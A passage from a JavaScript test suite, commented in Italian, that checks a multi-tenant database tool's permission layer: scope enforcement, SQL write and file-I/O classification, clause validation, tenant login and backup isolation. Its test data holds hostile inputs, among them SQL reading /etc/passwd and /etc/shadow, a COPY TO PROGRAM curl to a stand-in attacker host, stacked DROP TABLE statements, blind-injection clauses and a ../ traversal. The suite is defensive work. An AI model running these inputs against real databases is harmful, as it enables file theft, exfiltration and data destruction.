    await assert.rejects(() => editorConScope.shellWrite('shop', 'customers', { op: 'insertOne', doc: '{}' }),
      /Permesso negato/, 'scrittura da script fuori scope negata');

    // Un'operazione sconosciuta ricade sulla capability più restrittiva invece
    // di passare per assenza di mappatura.
    await assert.rejects(() => editorScript.shellWrite('shop', 'orders', { op: 'operazioneStrana' }),
      /Permesso negato/, 'operazione non mappata trattata come la più restrittiva');
  }
  console.log('  OK   Scritture da script soggette ai permessi (Fase C)');

  /* --- Scope e bersaglio vuoto (CDB-03) -------------------------------------- */
  // `matchesAny` distingue tre stati: undefined = operazione senza bersaglio
  // (passa), null/'' = bersaglio atteso ma mancante (NEGA), stringa = confronto.
  {
    assert.strictEqual(matchesAny(['reporting'], undefined), true, 'operazione senza bersaglio: consentita');
    assert.strictEqual(matchesAny(['reporting'], ''), false, 'bersaglio vuoto dal client: negato');
    assert.strictEqual(matchesAny(['reporting'], null), false, 'bersaglio nullo dal client: negato');
    assert.strictEqual(matchesAny(['reporting'], 'reporting'), true, 'bersaglio nello scope: consentito');
    assert.strictEqual(matchesAny(['reporting'], 'finance'), false, 'bersaglio fuori scope: negato');
    assert.strictEqual(matchesAny([], ''), true, 'nessuno scope su questa dimensione: sempre consentito');

    const scoped = makePrincipal({ _id: 'z1', type: 'subuser', ownerId: 'o1', email: 'z@x' },
      [{ connName: 'prod', role: 'viewer', capabilities: ['read'], scope: { databases: ['reporting'], collections: [] } }]);

    // Lo scenario dell'audit: `{ db: '', coll: '' }` faceva cadere il confronto.
    assert.strictEqual(can(scoped, { connName: 'prod', capability: 'read', db: '', coll: '' }), false,
      'db/coll vuoti nel payload non devono piu\' scavalcare lo scope');
    assert.strictEqual(can(scoped, { connName: 'prod', capability: 'read', db: 'finance' }), false,
      'database fuori scope negato');
    assert.strictEqual(can(scoped, { connName: 'prod', capability: 'read', db: 'reporting' }), true,
      'database nello scope consentito');

    // La regressione da evitare: le operazioni che NON hanno un bersaglio
    // (listDatabases, search, watchSchema) devono continuare a passare, o la
    // sidebar resterebbe vuota proprio a chi ha uno scope.
    assert.strictEqual(can(scoped, { connName: 'prod', capability: 'read' }), true,
      'operazione senza bersaglio: consentita anche con scope attivo');

    const listing = guardStrategy({
      type: 'mongodb',
      async listDatabases() { return [{ name: 'reporting' }, { name: 'finance' }]; },
      async watchSchema() { return true; },
    }, { principal: scoped, connName: 'prod' });
    const dbs = await listing.listDatabases();
    assert.deepStrictEqual(dbs.map((d) => d.name), ['reporting'],
      'listDatabases resta permessa e viene FILTRATA, non negata');
    await listing.watchSchema({});
    console.log('  OK   Scope non aggirabile con bersaglio vuoto, navigazione intatta (CDB-03)');
  }

  /* --- Classificazione lettura/scrittura del SQL (CDB-02) -------------------- */
  // isWriteSql decide SIA la capability SIA la categoria nell'audit: guardare la
  // sola prima parola lasciava tre bypass, tutti registrati come "letture".
  {
    const { isWriteSql } = require('../auth/capabilities');

    // Letture legittime: non devono diventare scritture, o verrebbero negate a
    // chi oggi le esegue senza problemi (falsi positivi da stringhe e commenti).
    const letture = [
      'SELECT 1',
      'select * from clienti where eta > 30 limit 10',
      "SELECT * FROM note WHERE testo = 'a;b'",
      "SELECT * FROM audit WHERE azione = 'DELETE'",
      "SELECT * FROM log WHERE msg = 'DROP TABLE x; GRANT ALL'",
      'SELECT updated_at, created_at, deleted FROM ordini',
      'WITH x AS (SELECT 1) SELECT * FROM x',
      'EXPLAIN SELECT * FROM clienti',
      'SHOW TABLES',
      'SELECT a."update" FROM t a',
      'SELECT * FROM t -- commento con DELETE',
      'SELECT * FROM t /* commento con DROP TABLE */',
    ];
    for (const q of letture) {
      assert.strictEqual(isWriteSql(q), false, `lettura non deve essere classificata scrittura: ${q}`);
    }

    const scritture = [
      'DELETE FROM clienti',
      'UPDATE clienti SET eta = 1',
      '/* commento */ DELETE FROM users',                          // bypass 1: commento iniziale
      'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x', // bypass 2: CTE di scrittura (PostgreSQL)
      'SELECT 1; DROP TABLE users;',                               // bypass 3: multi-statement
      'GRANT ALL PRIVILEGES ON *.* TO evil',
      'TRUNCATE clienti',
      'CALL procedura()',
      '/*!50000 DELETE FROM utenti */',
      '/*M! DROP TABLE utenti */',
    ];
    for (const q of scritture) {
      assert.strictEqual(isWriteSql(q), true, `scrittura da riconoscere: ${q}`);
    }
    console.log('  OK   Classificazione SQL lettura/scrittura senza bypass (CDB-02)');
  }

  // --- I/O su file dell'host del DBMS (CDB-A04) -----------------------------
  {
    const { isWriteSql, isFileIoSql } = require('../auth/capabilities');

    // Cominciano per SELECT e non contengono keyword di scrittura SQL: prima
    // erano `read`, quindi eseguibili da un viewer e registrati come LETTURE.
    const suFile = [
      "SELECT * FROM clienti INTO OUTFILE '/var/lib/mysql-files/dump.csv'",
      "select id into dumpfile '/tmp/x' from u",
      "SELECT * FROM t INTO   OUTFILE '/tmp/x'",
      "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
      "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
      "LOAD XML LOCAL INFILE '/etc/passwd' INTO TABLE t",
      "SELECT LOAD_FILE('/etc/shadow')",
      "SELECT load_file ('/etc/shadow')",
      "SELECT pg_read_file('/etc/passwd')",
      "SELECT pg_catalog.pg_read_binary_file('/etc/passwd')",
      `SELECT "pg_catalog"."pg_read_file"('/etc/passwd')`,
      "SELECT lo_export(42, '/tmp/oggetto')",
      "COPY clienti TO '/tmp/clienti.csv'",
      "COPY clienti TO PROGRAM 'curl https://attacker.invalid'",
    ];
    for (const q of suFile) {
      assert.strictEqual(isFileIoSql(q), true, `I/O su file da riconoscere: ${q}`);
      assert.strictEqual(isWriteSql(q), true, `I/O su file vale scrittura (capability e audit): ${q}`);
    }

    // Nessun falso positivo: la normalizzazione toglie stringhe e commenti,
    // quindi le stesse parole dentro un dato o un nome non contano.
    const innocue = [
      "SELECT * FROM log WHERE msg = 'INTO OUTFILE /tmp/x'",
      'SELECT * FROM t -- INTO OUTFILE /tmp/x',
      'SELECT infile_path, outfile_path FROM configurazioni',
      "SELECT * FROM log WHERE msg = 'pg_read_file(/etc/passwd)'",
      "SELECT * FROM log WHERE msg = 'LOAD XML INFILE /etc/passwd'",
      'SELECT * FROM t -- COPY clienti TO /tmp/x',
      'SELECT * FROM t /* LOAD XML INFILE /etc/passwd */',
      'SELECT copy FROM configurazioni',
      'SELECT * FROM caricamenti WHERE tipo = 1',
      'INSERT INTO clienti (nome) VALUES (1)',
    ];
    for (const q of innocue) {
      assert.strictEqual(isFileIoSql(q), false, `non è I/O su file: ${q}`);
    }
    // …ma una INSERT resta una scrittura per la keyword, non per il file.
    assert.strictEqual(isWriteSql('INSERT INTO clienti (nome) VALUES (1)'), true);

    // Il Proxy nega l'operazione a un sottoutente qualunque sia la capability:
    // il file finisce comunque FUORI dallo scope, sul filesystem del server.
    const raw = {
      type: 'mysql',
      async collectionAggregate() { return { docs: [], columns: [], total: 0 }; },
      async collectionFind() { return { docs: [], columns: [], total: 0 }; },
    };
    const editor = makePrincipal(
      { _id: 'u1', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'editor', capabilities: ['read', 'write'], scope: null }],
    );
    const g = guardStrategy(raw, { principal: editor, connName: 'c' });
    await assert.rejects(
      () => g.collectionAggregate('db', null, { pipeline: "SELECT * FROM t INTO OUTFILE '/tmp/x'" }),
      /file sul server del database/,
      'SQL Raw con INTO OUTFILE negato al sottoutente anche con capability di scrittura',
    );
    // Su MySQL `… WHERE 1 INTO OUTFILE '…'` è sintassi valida: anche la casella
    // "filtro" della griglia è una porta, non solo SQL Raw.
    await assert.rejects(
      () => g.collectionFind('db', 't', { filter: "1 INTO OUTFILE '/tmp/x'" }),
      /file sul server del database/,
      'il filtro della griglia non può contenere un I/O su file',
    );
    await assert.doesNotReject(
      () => g.collectionFind('db', 't', { filter: 'eta > 30' }),
      'un filtro normale continua a funzionare',
    );

    const rawPg = {
      type: 'postgresql',
      async collectionAggregate() { return { docs: [], columns: [], total: 0 }; },
    };
    const pgPowerUser = makePrincipal(
      { _id: 'u-pg', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'admin', capabilities: ['read', 'write', 'delete', 'ddl'], scope: null }],
    );
    const gPg = guardStrategy(rawPg, { principal: pgPowerUser, connName: 'c' });
    await assert.rejects(
      () => gPg.collectionAggregate('public', null, { pipeline: "SELECT pg_read_file('/etc/passwd')" }),
      /file sul server del database/,
      'le funzioni file PostgreSQL sono negate anche a un sottoutente con tutte le capability dati',
    );
    await assert.rejects(
      () => gPg.collectionAggregate('public', null, { pipeline: "COPY clienti TO '/tmp/clienti.csv'" }),
      /file sul server del database/,
      'COPY PostgreSQL non può accedere al filesystem dell\'host',
    );

    // L'owner resta libero (stessa scelta di expectRead): sulla propria
    // installazione un export via OUTFILE è un uso legittimo.
    const owner = makePrincipal({ _id: 'o1', ownerId: 'o1', type: 'owner' }, []);
    const go = guardStrategy(raw, { principal: owner, connName: 'c' });
    await assert.doesNotReject(
      () => go.collectionAggregate('db', null, { pipeline: "SELECT * FROM t INTO OUTFILE '/tmp/x'" }),
      'l\'owner non è soggetto al blocco',
    );

    // La barriera indipendente dal parser ora c'è anche su MySQL: una lettura
    // eseguita da un sottoutente porta expectRead, che la strategia traduce in
    // START TRANSACTION READ ONLY.
    const visto = {};
    const raw2 = {
      type: 'mysql',
      async collectionAggregate(_db, _coll, payload) { visto.expectRead = payload.expectRead; return { docs: [] }; },
    };
    const viewer = makePrincipal(
      { _id: 'u2', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'viewer', capabilities: ['read'], scope: null }],
    );
    await guardStrategy(raw2, { principal: viewer, connName: 'c' })
      .collectionAggregate('db', null, { pipeline: 'SELECT 1' });
    assert.strictEqual(visto.expectRead, true, 'una lettura di un sottoutente viaggia con expectRead');
    console.log('  OK   I/O su file del DBMS negato e classificato scrittura (CDB-A04)');
  }

  /* --- Barriera READ ONLY indipendente dal parser (CDB-02) ------------------- */
  {
    const seen = [];
    const pgStrategy = () => ({
      type: 'postgresql',
      async collectionAggregate(db, coll, payload) { seen.push({ ...payload }); return { docs: [] }; },
    });
    const sub = makePrincipal({ _id: 's9', type: 'subuser', ownerId: 'o9', email: 's@x' },
      [{ connName: 'prod', role: 'editor', capabilities: ['read', 'write'], scope: null }]);
    const own = makePrincipal({ _id: 'o9', type: 'owner', ownerId: 'o9', email: 'o@x' }, []);

    await guardStrategy(pgStrategy(), { principal: sub, connName: 'prod' })
      .collectionAggregate('public', null, { pipeline: 'SELECT 1' });
    assert.strictEqual(seen[0].expectRead, true, 'sottoutente + lettura: il motore impone la transazione di sola lettura');

    seen.length = 0;
    await guardStrategy(pgStrategy(), { principal: sub, connName: 'prod' })
      .collectionAggregate('public', null, { pipeline: 'UPDATE t SET x = 1' });
    assert.ok(!seen[0].expectRead, 'scrittura riconosciuta: nessuna transazione di sola lettura');

    seen.length = 0;
    await guardStrategy(pgStrategy(), { principal: own, connName: 'prod' })
      .collectionAggregate('public', null, { pipeline: 'SELECT elabora_ordini()' });
    assert.ok(!seen[0].expectRead, 'owner: comportamento invariato (funzioni con effetti collaterali, temp table, SET)');
    console.log('  OK   Barriera READ ONLY per i sottoutenti, owner invariato (CDB-02)');
  }

  /* --- Capability SQL granulari e statement singolo ----------------------- */
  {
    const eseguite = [];
    const pgStrategy = () => ({
      type: 'postgresql',
      async collectionAggregate(_db, _coll, payload) { eseguite.push(payload.pipeline); return { docs: [] }; },
    });
    const deleteUser = makePrincipal(
      { _id: 'sql-delete', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'delete'], scope: null }],
    );
    const ddlUser = makePrincipal(
      { _id: 'sql-ddl', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'ddl'], scope: null }],
    );
    const writeOnlyUser = makePrincipal(
      { _id: 'sql-write-only', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
    );
    const deleteOnlyUser = makePrincipal(
      { _id: 'sql-delete-only', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['delete'], scope: null }],
    );
    const ddlOnlyUser = makePrincipal(
      { _id: 'sql-ddl-only', type: 'subuser', ownerId: 'o1' },
      [{ connName: 'prod', role: 'custom', capabilities: ['ddl'], scope: null }],
    );

    const editorSql = guardStrategy(pgStrategy(), { principal: editor, connName: 'prod' });
    await editorSql.collectionAggregate('public', null, { pipeline: 'UPDATE clienti SET attivo = 1' });
    await assert.rejects(
      () => editorSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' }),
      /Permesso negato.*cancellazione/,
      'read+write non include implicitamente delete',
    );
    await assert.rejects(
      () => editorSql.collectionAggregate('public', null, { pipeline: 'DROP TABLE clienti' }),
      /Permesso negato.*modifica della struttura/,
      'read+write non include implicitamente ddl',
    );

    const deleteSql = guardStrategy(pgStrategy(), { principal: deleteUser, connName: 'prod' });
    await deleteSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' });
    await deleteSql.collectionAggregate('public', null, {
      pipeline: 'WITH rimossi AS (DELETE FROM clienti RETURNING *) SELECT * FROM rimossi',
    });
    await assert.rejects(
      () => deleteSql.collectionAggregate('public', null, { pipeline: 'UPDATE clienti SET attivo = 0' }),
      /Permesso negato.*scrittura/,
    );

    const ddlSql = guardStrategy(pgStrategy(), { principal: ddlUser, connName: 'prod' });
    await ddlSql.collectionAggregate('public', null, { pipeline: 'DROP TABLE clienti' });
    await assert.rejects(
      () => ddlSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' }),
      /Permesso negato.*cancellazione/,
    );
    await assert.rejects(
      () => guardStrategy(pgStrategy(), { principal: writeOnlyUser, connName: 'prod' })
        .collectionAggregate('public', null, {
          pipeline: 'UPDATE clienti SET attivo = 1 RETURNING email',
        }),
      /Permesso negato.*lettura/,
      'UPDATE RETURNING non esfiltra dati con la sola capability write',
    );
    await assert.rejects(
      () => guardStrategy(pgStrategy(), { principal: deleteOnlyUser, connName: 'prod' })
        .collectionAggregate('public', null, {
          pipeline: 'DELETE FROM clienti WHERE id = 1 RETURNING email',
        }),
      /Permesso negato.*lettura/,
      'DELETE RETURNING richiede read oltre a delete',
    );
    await assert.rejects(
      () => guardStrategy(pgStrategy(), { principal: ddlOnlyUser, connName: 'prod' })
        .collectionAggregate('public', null, {
          pipeline: 'CREATE TABLE copia AS SELECT * FROM clienti',
        }),
      /Permesso negato.*lettura/,
      'CREATE TABLE AS SELECT richiede read oltre a ddl',
    );

    await assert.rejects(
      () => guardStrategy(pgStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' })
        .collectionAggregate('public', null, { pipeline: 'SELECT 1; DROP TABLE clienti' }),
      /Più istruzioni SQL/,
      'SQL Raw è fail-closed sul multi-statement anche per root: gli script usano ScriptRunner',
    );
    await assert.rejects(
      () => guardStrategy(pgStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' })
        .collectionAggregate('public', null, { pipeline: '/*!50000 DELETE FROM clienti */' }),
      /commenti SQL eseguibili/,
      'i commenti condizionali MySQL/MariaDB non possono occultare un comando',
    );
    assert.strictEqual(eseguite.length, 4, 'solo le quattro istruzioni autorizzate raggiungono la strategia');
    console.log('  OK   SQL Raw: capability delete/ddl distinte e multi-statement negato');
  }

  /* --- Clausole WHERE/ORDER BY libere e scope (CDB-05) ----------------------- */
  // Su SQL `filter` e `sort` sono frammenti grezzi: lo scope protegge il nome
  // della tabella, non il testo della query. Per i principal CON scope si esige
  // la forma strutturata; per owner e sottoutenti senza scope nulla cambia.
  {
    const { assertSimpleClause } = require('../auth/sqlClause');

    const ammessi = [
      "stato = 'aperto'",
      'totale > 100 AND totale <= 500',
      "nome LIKE 'Mar%' OR cognome LIKE 'Ros%'",
      'eta BETWEEN 18 AND 65',
      'citta IN (1, 2, 3)',
      "citta NOT IN ('Roma','Bari')",
      'note IS NOT NULL',
      '(a = 1 OR b = 2) AND c = 3',
      'created_at DESC',
      'cognome ASC, nome ASC',
      "descrizione = 'contiene SELECT, ; e -- ma dentro una stringa'",
    ];
    for (const c of ammessi) assertSimpleClause(c, 'filtro');

    const rifiutati = [
      "1=1 AND (SELECT COUNT(*) FROM utenti WHERE password LIKE 'a%') > 0", // oracolo binario
      '1=1; DROP TABLE clienti',
      '1=1 -- commento',
      '1=1 /* commento */',
      'id > 0 UNION SELECT 1',
      'SLEEP(5)',
      'id > 0 AND BENCHMARK(1000000, MD5(1))',
      "id > 0 AND LOAD_FILE('/etc/passwd') IS NOT NULL",
      "id > 0 INTO OUTFILE '/tmp/x'",
    ];
    for (const c of rifiutati) {
      assert.throws(() => assertSimpleClause(c, 'filtro'), /non consentito/, `clausola rifiutata: ${c}`);
    }

    // Il Proxy applica la regola SOLO a chi ha uno scope, e solo su SQL.
    const sqlStrategy = () => ({
      type: 'mysql',
      async collectionFind(db, coll, payload) { return { docs: [], payload }; },
    });
    const conScope = makePrincipal({ _id: 's1', type: 'subuser', ownerId: 'o1', email: 's@x' },
      [{ connName: 'prod', role: 'viewer', capabilities: ['read'], scope: { databases: ['shop'], collections: ['ordini'] } }]);
    const senzaScope = makePrincipal({ _id: 's2', type: 'subuser', ownerId: 'o1', email: 't@x' },
      [{ connName: 'prod', role: 'viewer', capabilities: ['read'], scope: null }]);

    const gScoped = guardStrategy(sqlStrategy(), { principal: conScope, connName: 'prod' });
    await assert.rejects(() => gScoped.collectionFind('shop', 'ordini', { filter: '1=1 AND (SELECT 1) > 0' }),
      /non consentito/, 'sotto-query negata a chi ha uno scope');
    await gScoped.collectionFind('shop', 'ordini', { filter: 'totale > 10' }); // forma strutturata: ok

    const gFree = guardStrategy(sqlStrategy(), { principal: senzaScope, connName: 'prod' });
    await gFree.collectionFind('shop', 'ordini', { filter: '1=1 AND (SELECT 1) > 0' }); // nessuna regressione
    console.log('  OK   Clausole libere limitate ai soli principal con scope (CDB-05)');
  }

  /* --- Revoca grant quando una connessione cambia identità ------------------ */
  {
    const { AppStore } = require('../auth/AppStore');
    const rows = [
      { ownerId: 'owner-a', connName: 'prod', subjectId: 'u1' },
      { ownerId: 'owner-a', connName: 'prod', subjectId: 'u2' },
      { ownerId: 'owner-a', connName: 'altro', subjectId: 'u3' },
      { ownerId: 'owner-b', connName: 'prod', subjectId: 'u4' },
    ];
    const store = new AppStore({ uri: 'mongodb://unused', dbName: 'unused' });
    store.col = (name) => {
      assert.strictEqual(name, 'grants');
      return {
        find(query) {
          const selected = rows.filter(
            (row) => row.ownerId === query.ownerId && row.connName === query.connName
          );
          return {
            project() {
              return { toArray: async () => selected.map((row) => ({ subjectId: row.subjectId })) };
            },
          };
        },
        async deleteMany(query) {
          let deletedCount = 0;
          for (let i = rows.length - 1; i >= 0; i--) {
            if (rows[i].ownerId === query.ownerId && rows[i].connName === query.connName) {
              rows.splice(i, 1);
              deletedCount++;
            }
          }
          return { deletedCount };
        },
      };
    };
    const revoked = await store.revokeGrantsForConnection('owner-a', 'prod');
    assert.deepStrictEqual(revoked, { deleted: 2, subjectIds: ['u1', 'u2'] });
    assert.deepStrictEqual(
      rows.map((row) => [row.ownerId, row.connName, row.subjectId]),
      [['owner-a', 'altro', 'u3'], ['owner-b', 'prod', 'u4']],
      'la revoca non tocca connessioni omonime di altri tenant',
    );
    console.log('  OK   Delete/rename connessione revocano i grant legati al vecchio nome');
  }

  /* --- Login dei sottoutenti e isolamento fra tenant (CDB-44) ---------------- */
  // L'unicità delle email è per tenant: due owner possono avere un sottoutente
  // con la stessa email. Il login deve verificare TUTTI gli omonimi, non il
  // primo che capita, altrimenti l'utente legittimo di un tenant viene respinto
  // con "Email o password non validi" pur avendo credenziali corrette.
  {
    const { AppStore } = require('../auth/AppStore');
    const { hashPassword } = require('../auth/sessions');

    const users = [
      { _id: 'u1', ownerId: 'ownerA', email: 'mario@azienda.it', type: 'subuser', status: 'active', passwordHash: hashPassword('password-A') },
      { _id: 'u2', ownerId: 'ownerB', email: 'mario@azienda.it', type: 'subuser', status: 'active', passwordHash: hashPassword('password-B') },
      { _id: 'u3', ownerId: 'ownerC', email: 'sospeso@azienda.it', type: 'subuser', status: 'suspended', passwordHash: hashPassword('password-C') },
    ];
    const store = new AppStore({ uri: 'mongodb://unused', dbName: 'unused' });
    store.col = () => ({
      find: (q) => ({ toArray: async () => users.filter((u) => u.email === q.email && u.type === q.type) }),
    });

    const a = await store.verifySubUser('mario@azienda.it', 'password-A');
    assert.ok(a && a.ownerId === 'ownerA', 'il sottoutente del tenant A deve poter accedere');
    const b = await store.verifySubUser('mario@azienda.it', 'password-B');
    assert.ok(b && b.ownerId === 'ownerB', 'anche il sottoutente omonimo del tenant B deve poter accedere');
    assert.strictEqual(await store.verifySubUser('mario@azienda.it', 'sbagliata'), null, 'password errata: nessun accesso');
    assert.strictEqual(await store.verifySubUser('sospeso@azienda.it', 'password-C'), null, 'utente sospeso: nessun accesso');

    // Stessa email E stessa password su due tenant: rifiuto esplicito invece di
    // far entrare qualcuno nel tenant sbagliato.
    users.push({ _id: 'u4', ownerId: 'ownerD', email: 'mario@azienda.it', type: 'subuser', status: 'active', passwordHash: hashPassword('password-A') });
    await assert.rejects(() => store.verifySubUser('mario@azienda.it', 'password-A'),
      (e) => e.ambiguousLogin === true, 'credenziali ambigue fra tenant: accesso rifiutato con motivo');
    console.log('  OK   Login sottoutenti: isolamento fra tenant omonimi (CDB-44)');
  }

  // --- Isolamento multi-tenant della cartella dei backup (CDB-A01) ----------
  {
    const path = require('path');
    const { backupRootFor, resolveBackupPath } = require('../backup/lib/policy');
    const ROOT = path.resolve('/srv/codedb/backups');

    // RBAC spento (e app desktop): i backup restano dov'erano, altrimenti
    // un aggiornamento farebbe "sparire" i backup dell'installazione esistente.
    assert.strictEqual(backupRootFor(ROOT, 'qualsiasi', { rbac: false }), ROOT,
      'con RBAC spento la radice dei backup non cambia');
    assert.strictEqual(backupRootFor(ROOT, 'local', { rbac: true }), ROOT,
      'l\'owner locale (root dell\'installazione) usa la radice storica');
    assert.strictEqual(backupRootFor(ROOT, '', { rbac: true }), ROOT,
      'senza ownerId si ricade sulla radice storica');

    // Due tenant, due radici distinte e nessuna contenuta nell'altra.
    const a = backupRootFor(ROOT, 'ownerA', { rbac: true });
    const b = backupRootFor(ROOT, 'ownerB', { rbac: true });
    assert.notStrictEqual(a, b, 'due tenant non condividono la radice dei backup');
    assert.ok(path.relative(a, b).startsWith('..'),
      'la radice di un tenant non sta dentro quella di un altro');
    assert.ok(a.startsWith(ROOT) && b.startsWith(ROOT), 'entrambe restano dentro BACKUP_ROOT');

    // Un ownerId ostile non può risalire la gerarchia né uscire dalla radice.
    const ostile = backupRootFor(ROOT, '../../etc', { rbac: true });
    assert.ok(!path.relative(ROOT, ostile).startsWith('..'),
      'un ownerId con ../ resta confinato dentro BACKUP_ROOT');

    // Il confinamento del percorso richiesto dal client si applica alla radice
    // del tenant: da lì non si raggiunge quella di un altro.
    assert.throws(() => resolveBackupPath('../ownerB', a, 'origine'),
      /non consentito/, 'dal tenant A non si può indicare la cartella del tenant B');
    assert.strictEqual(resolveBackupPath('', a, 'elenco'), a,
      'percorso vuoto = radice del proprio tenant');
    console.log('  OK   Backup partizionati per tenant (CDB-A01)');
  }

  // --- SQL Raw: lo scope vale sulle tabelle CITATE (CDB-A03) ---------------
  {
    const eseguite = [];
    const raw = {
      type: 'mysql',
      async collectionAggregate(db, coll, payload) { eseguite.push(payload.pipeline); return { docs: [] }; },
    };
    const conScope = makePrincipal(
      { _id: 'u1', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['ordini*'] } }],
    );
    const g = guardStrategy(raw, { principal: conScope, connName: 'c' });

    // Lettura fuori perimetro: il primo FROM è nello scope, la JOIN no.
    await assert.rejects(
      () => g.collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM ordini JOIN utenti ON 1=1' }),
      /"utenti" è fuori dal tuo ambito/,
      'la JOIN fuori perimetro non passa più con il primo FROM nello scope',
    );
    // Scrittura fuori perimetro: nessun FROM, quindi il bersaglio lo sceglieva
    // il client — bastava dichiarare `coll: 'ordini'`.
    await assert.rejects(
      () => g.collectionAggregate('shop', 'ordini', { pipeline: "UPDATE utenti SET ruolo='admin'" }),
      /"utenti" è fuori dal tuo ambito/,
      'una UPDATE senza FROM non è più autorizzata dal coll dichiarato dal client',
    );

    // Il DDL libero ha molti bersagli che il parser delle tabelle non può
    // dimostrare (database/schema, view, ruoli e privilegi). Con scope attivo
    // viene chiuso fail-closed; le operazioni strutturate restano disponibili.
    const ddlConScope = makePrincipal(
      { _id: 'u-ddl-scope', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'custom', capabilities: ['read', 'write', 'delete', 'ddl'], scope: { databases: ['shop'], collections: ['ordini'] } }],
    );
    const gDdl = guardStrategy(raw, { principal: ddlConScope, connName: 'c' });
    const { tabelleCitate } = require('../auth/sqlTables');
    assert.deepStrictEqual(
      tabelleCitate('DELETE FROM ordini USING utenti WHERE ordini.id = utenti.id').tabelle.map((t) => t.tabella),
      ['ordini', 'utenti'],
    );
    assert.deepStrictEqual(
      tabelleCitate('MERGE INTO ordini USING utenti ON ordini.id = utenti.id WHEN MATCHED THEN UPDATE SET x = 1').tabelle.map((t) => t.tabella),
      ['ordini', 'utenti'],
    );
    assert.deepStrictEqual(
      tabelleCitate('SELECT * FROM ordini JOIN clienti USING (id)').tabelle.map((t) => t.tabella),
      ['ordini', 'clienti'],
      'JOIN USING(colonna) non scambia la colonna per una tabella',
    );
    await assert.rejects(
      () => gDdl.collectionAggregate('shop', 'ordini', {
        pipeline: 'DELETE FROM ordini USING utenti WHERE ordini.id = utenti.id',
      }),
      /"utenti" è fuori dal tuo ambito/,
    );
    await assert.rejects(
      () => gDdl.collectionAggregate('shop', 'ordini', {
        pipeline: 'MERGE INTO ordini USING utenti ON ordini.id = utenti.id WHEN MATCHED THEN UPDATE SET x = 1',
      }),
      /"utenti" è fuori dal tuo ambito/,
    );
    const ddlNonVerificabile = [
      'DROP DATABASE altro',
      'DROP SCHEMA altro',
      'CREATE VIEW utenti AS SELECT * FROM ordini',
      'GRANT SELECT ON shop.ordini TO altro_utente',
      'CREATE ROLE auditor',
    ];
    for (const sql of ddlNonVerificabile) {
      await assert.rejects(
        () => gDdl.collectionAggregate('shop', 'ordini', { pipeline: sql }),
        /SQL Raw non consentito con un ambito limitato/,
        `DDL non verificabile negato: ${sql}`,
      );
    }
    assert.strictEqual(eseguite.length, 0, 'nessuna query fuori scope ha raggiunto il database');

    // Anche se tutti i nomi visibili sono nello scope, view e funzioni possono
    // avere dipendenze invisibili: SQL Raw scoped resta fail-closed.
    await assert.rejects(
      () => g.collectionAggregate('shop', 'ordini', {
        pipeline: 'SELECT * FROM ordini WHERE totale > 100',
      }),
      /SQL Raw non consentito con un ambito limitato/,
    );
    await assert.rejects(
      () => g.collectionAggregate('shop', 'ordini', {
        pipeline: 'SELECT * FROM ordini_view',
      }),
      /SQL Raw non consentito con un ambito limitato/,
      'una view autorizzata può dipendere da tabelle fuori scope',
    );
    await assert.rejects(
      () => g.collectionAggregate('shop', 'ordini', {
        pipeline: 'SELECT leak_secret()',
      }),
      /SQL Raw non consentito con un ambito limitato/,
      'una funzione scalare non espone al parser le tabelle che legge',
    );
    assert.strictEqual(eseguite.length, 0, 'nessun SQL Raw scoped raggiunge il database');

    // Owner e sottoutenti SENZA scope non perdono nulla: stessa regola già
    // adottata per le clausole libere della griglia.
    const senzaScope = makePrincipal(
      { _id: 'u2', ownerId: 'o1', type: 'subuser' },
      [{ connName: 'c', role: 'editor', capabilities: ['read', 'write'], scope: null }],
    );
    await guardStrategy(raw, { principal: senzaScope, connName: 'c' })
      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
    const owner = makePrincipal({ _id: 'o1', ownerId: 'o1', type: 'owner' }, []);
    await guardStrategy(raw, { principal: owner, connName: 'c' })
      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
    const scopeConWildcard = makePrincipal(
      { _id: 'u3', ownerId: 'o1', type: 'subuser' },
      [{
        connName: 'c',
        role: 'editor',
        capabilities: ['read', 'write'],
        scope: { databases: ['shop', '*'], collections: ['ordini', '*'] },
      }],
    );
    await guardStrategy(raw, { principal: scopeConWildcard, connName: 'c' })
      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
    const scopeConListeVuote = makePrincipal(
      { _id: 'u4', ownerId: 'o1', type: 'subuser' },
      [{
        connName: 'c',
        role: 'editor',
        capabilities: ['read', 'write'],
        scope: { databases: [], collections: [] },
      }],
    );
    await guardStrategy(raw, { principal: scopeConListeVuote, connName: 'c' })
      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
    assert.strictEqual(eseguite.length, 4, 'gli scope effettivamente illimitati non bloccano SQL Raw');

    // Su MongoDB `pipeline` è EJSON, non SQL: la regola non deve toccarlo.
    const mongo = { type: 'mongodb', async collectionAggregate() { return { docs: [] }; } };
    await assert.doesNotReject(
      () => guardStrategy(mongo, { principal: conScope, connName: 'c' })
        .collectionAggregate('shop', 'ordini', { pipeline: '[{"$match":{"from":"utenti"}}]' }),
      'la pipeline MongoDB non passa dall\'analizzatore SQL',
    );
    console.log('  OK   SQL Raw fail-closed sugli scope realmente limitati (CDB-A03)');
  }

  // --- Amministratore dell'installazione vs del tenant (CDB-A02) -----------
  {
